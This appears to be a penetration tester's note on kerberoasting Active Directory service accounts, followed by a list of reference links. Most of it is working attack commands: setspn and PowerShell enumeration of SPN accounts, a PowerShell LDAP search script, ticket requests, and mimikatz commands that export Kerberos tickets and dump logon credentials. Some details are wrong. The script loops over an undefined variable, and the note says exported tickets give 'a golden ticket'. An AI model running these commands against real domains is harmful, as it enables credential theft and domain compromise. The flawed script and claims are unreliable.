# Living off the Land

Search Tag(s): #kerberoasting

## 01 - Enumeration

> [!IMPORTANT] Conditions
> When SPN service accounts like SQLService, iis_svc, MSSQL_SVC, etc. With two of the following conditions in order to achieve this:
> 1. It must be part of the **"Domain Admins"** group member.
> 2. Has **weak passwords** when the **Kerberos 5, etype 23, TGS-REP** hash type is crackable due to those reasons (refer to [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x00 - Exploitation/0xC - Password Cracking/Offline/John The Ripper/Usage#^0c9a3c|John The Ripper]] or [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x00 - Exploitation/0xC - Password Cracking/Offline/Hashcat/Usage#^87baa5|Hashcat]] section **under Offline Password Cracking**).

### 1.1 - Command Prompt

```
C:\> setspn.exe -L <username>

C:\> setspn.exe -L iis_service

C:\> setspn.exe -T <computername>.<domain.com> -q */*

C:\> setspn.exe -T <computername>.<domain.com> -q */* | findstr.exe SQL

mimikatz # kerberos::list /export

mimikatz # sekurlsa::logonpasswords
```

### 1.2 - PowerShell

```
PS C:\> Get-ADUser -Filter {serviceprincipalname -Like "*"} -Properties serviceprincipalname
```

```
PS C:\> Add-Type -AssemblyName System.IdentityModel

PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/<FQDN>'

PS C:\> klist
```

Retrieve SPN users that are possibly **kerberoastable** of the `samaccountname` and `serviceprincipalname`.

```powershell
PS C:\> Get-Content .\enumerateSPN.ps1
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString = $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$SearchString

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter = "serviceprincipalname=*http*"

$Result = $Searcher.FindAll()

foreach($obj in $Output) {
    foreach($prop in $obj.Properties) {
        $prop
    }
}
```

You'll get a golden ticket

```
mimikatz # kerberos::list /export
```

Right-Click > CTRL + Right-Click > Run as different user

```
mimikatz # sekurlsa::logonpasswords
```

---
## References

- [LOFLCAB: setspn](https://lofl-project.github.io/loflcab/Binaries/setspn/)

### Active Directory Security

- [Active Directory Security: SPNs](https://adsecurity.org/?page_id=183)

- [Active Directory Security Risk #101: Kerberos Unconstrained Delegation (or How Compromise of a Single Server Can Compromise the Domain)](https://adsecurity.org/?p=1667)

### Mubix

- [Malicious.link: Kerberoast Part 1](https://room362.com/posts/2016/kerberoast-pt1/)

- [Malicious.link: Kerberoast Part 2](https://room362.com/posts/2016/kerberoast-pt2/)

- [Malicious.link: Kerberoast Part 3](https://room362.com/posts/2016/kerberoast-pt3/)

### Pentestlab

- [Pentestlab Blog: SPN Discovery](https://pentestlab.blog/2018/06/04/spn-discovery/)

- [Pentestlab Blog: Kerberoast](https://pentestlab.blog/2018/06/12/kerberoast/)

### Red Team Notes

- [Red Team Notes: Active Directory Kerberos Abuse Child Domain Domain Admin to Enterprise Admin In Parent Domain](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

- [Red Team Notes: Active Directory Kerberos Abuse T1208-Kerberoasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)

### Hacking Articles

- [Hacking Articles: Deep Dive Into Kerberoasting Attack](https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/)

### Certcube

- [Certcube: Kerberoasting Simplified Attack and Defense](https://blog.certcube.com/kerberoasting-simplified-attack-and-defense/)

### XPNSec

- [XPNSec: Kerberos AD Attacks - Kerberoasting](https://blog.xpnsec.com/kerberos-attacks-part-1/)